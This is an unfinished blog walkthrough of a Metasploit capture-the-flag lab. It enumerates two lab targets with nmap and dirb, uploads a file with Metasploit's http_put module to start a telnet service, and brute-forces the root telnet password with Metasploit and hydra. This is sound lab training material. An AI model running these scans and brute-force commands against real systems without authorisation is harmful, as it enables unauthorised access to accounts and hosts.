+++
author = "Nick"
date = 2020-01-02T14:30:07Z
description = ""
draft = true
slug = "attack-defense-metasploit-ctf-5"
title = "Attack | Defense - Metasploit CTF 5"

+++


Welcome back to the third entry in this series. In the last entry we used three `Metasploit` modules to obtain `mysql` credentials and leverage them on the target machine.

## Overview
In this entry we will tackle the third Metasploit CTF on Pentester Academy. In this entry we will use two `Metasploit` modules. A module to test for valid user credentials and an authenticated RCE.

## Network Topology

![](/images/2019/12/image-77.png)

## Enumeration
We know that in this set of labs, we are given two targets. `Target-1` and `Target-2`. We will scan these directly. 

Command:
`nmap -sC -sV -T5 target-1`
`nmap -sC -sV -T5 target-2`

We can also combine both targets into a single command.

Command:
`nmap -sC -sV -T5 target-1 target-2`

Here are our results:
```
Nmap scan report for target-1 (192.132.185.3)
Host is up (0.000036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:C0:84:B9:03 (Unknown)
```
```
Nmap scan report for target-2 (192.132.185.4)
Host is up (0.000036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:4a:77:26:eb:63:83:5d:58:1d:fb:6b:4b:97:1e:44 (RSA)
|   256 cc:3b:73:25:12:38:68:1f:16:cd:5f:77:67:33:b4:a5 (ECDSA)
|_  256 a5:5f:c5:34:61:58:51:1f:0b:4f:50:1f:34:37:7a:d7 (ED25519)
MAC Address: 02:42:C0:84:B9:04 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see a web service running on `Target-1` and `SSH` running on `Target-2`. We will `curl` the the web service to see what is running. If you've never used `curl` before, it's short for client URL. It is a tool that lets us transfer data within URL and URL formats. We can make web requests with it, download files or even enumerate. If you aren't already, you should get familiar with it since it's an extraordinarily useful and common tool. [Here is free ebook](https://curl.haxx.se/book.html) on the tool by the creators!

Let's curl the target. By default it will use port 80, which is where we have things running.

Command:
`curl target-1`

![](/images/2020/01/image.png)

We are told to stop the `apache` server to start the telnet server. That's fun. We can create a file called `stop.txt` with the `touch` command.

Command:
`touch stop.txt`

This creates a blank file in our current working directory with the name stop.txt. Now that we have a file, we don't know where we should be putting it. We will want to enumerate the target a bit more. I would normally use `gobuster` for directory enumeration however it was not supplied with this CTF console. We will use `dirb`, it will work just as well.

If you aren't familiar with `dirb`, `dirbuster` or `gobuster`, you should be. They are basic directory enumeration tools for web targets. You supply them a wordlist and target and it will check each location sequentially according to the list.

Command:
`dirb http://target-1 -r -N 403`

The breakdown of the command is as follows:
`dirb` is our tool. 
`-r` tells it to not be recursive. So in case we find a rabbit hole of directories, we can shorten our scan time.
`-N` tells it to ignore the error following it. In this case `403`.

We find two locations `manual` and `access`. The later seems like a good target location, let's use that.

Once we have the file and location we will launch `Metasploit`. We can use the module `auxiliar/scanner/http/http_put` to upload a file. You can find this by `search`ing for `upload` inside `Metasploit`.

Command:
`msf5> use auxiliary/scanner/http/http_put`

We then want to `show` our `options`.

Command:
`msf5> show options` or `msf5> options`

![](/images/2020/01/image-1.png)

We have to set our `rhost`, `filename` and `path` for this module.

Command:
`msf5> set rhost target-1`
`msf5> set filename stop.txt`
`msf5> set path access`

We can then `run` our module.

Command:
`msf5> run` or `msf5> exploit`

![](/images/2020/01/CTF_5_http_put.gif)

We see that the file was sucessfully uploaded. Now we can rescan the target for any open `telnet` ports, typically port 23.

Command:
`nmap -T5 -p- target-1`

![](/images/2020/01/image-2.png)

We now have a `telnet` port available. Now we `telnet` to the target.

Command:
`telnet`
`telnet> open`
`(to) target-1`

We are then greeted with a login prompt.

![](/images/2020/01/image-3.png)

We try and login with standard default credentials for admin, root and other services but none work. We are then booted out after 5 failed attempts. We enumerate the service with an addition `nmap` scan.

Command:
`scan -sC -sV -T5 -p 23 target-1`

We get back very little info:
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
MAC Address: 02:42:C0:84:B9:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We launch `Metasploit` and use the `auxiliary/scanner/telnet/telnet_version` module to see what it might show.

![](/images/2020/01/image-4.png)

We see Ubuntu 16.04.5 LTS running and that's about it. Looks like we might need to brute force our way in. We can `use` the module `auxiliary/scanner/telnet/telnet_login`. Inside this module we have a few `options`:

![](/images/2020/01/image-6.png)

We want to `set` the following: `rhost`, `username` and `pass_file`. You can also set a `user_file` as well. This option looks for a list of users should you not want to target just the root account. In our case though, we are just going to set our `username` to root and the hope it's what we want.

Commands:
`msf5> set rhost target-1`
`msf5> set username root`
`msf5> set pass_file ~/wordlists/100-common-passwords.txt`

Then we `run` it.

Command:
`msf5> run` or `msf5> exploit`

Eventually we get a match!



![](/images/2020/01/image-5.png)

We can now log in as root to `target-1`. Since `Metasploit` does a decent job with workflow, it has already created this login session for us! We can view our sessions to see which is active.

Command:
`msf5> sessions`

We then interact with the session we want.

Command:
`msf5> session -i 1`

But it seems to fail. We try the password manually, and it also fails. Hmmm. Is it possible that this password changes randomly? So we retry the scan and sure enough it seems to use a new password. S

![](/images/2020/01/image-7.png)

So now, the question is what's next? It seems that it changes either every minute or every successful attempt. It also seems to go to the next password in the list. We know that we can enumerate the root username password combination but what good is that to us?

They could also be false positives. So in oder to double check our results, we will launch `hydra`. 

`Hydra` is a tool used mostly for dictionary attacks amongst other things. In this case we are going to point it at the telnet login and see if we get similar results back. 

Command:
`hydra -L /usr/share/wordlists/metasploit/unix_usernames -P /usr/share/wordlists/metasploit/unix_passwords.txt` target-1 telnet`

Our command is as follows:
`-L` for a Username list. If we knew a username reliably, we could use `-l` for a specific list.
`-P` for a password list. Alternatly `-p` for a specific password.
We then list our target as `target-1` and our protocol as `telnet`.

![](/images/2020/01/image-9.png)

We get a match! Time to use the `telnet_login` module again.



![](/images/2020/01/image-10.png)

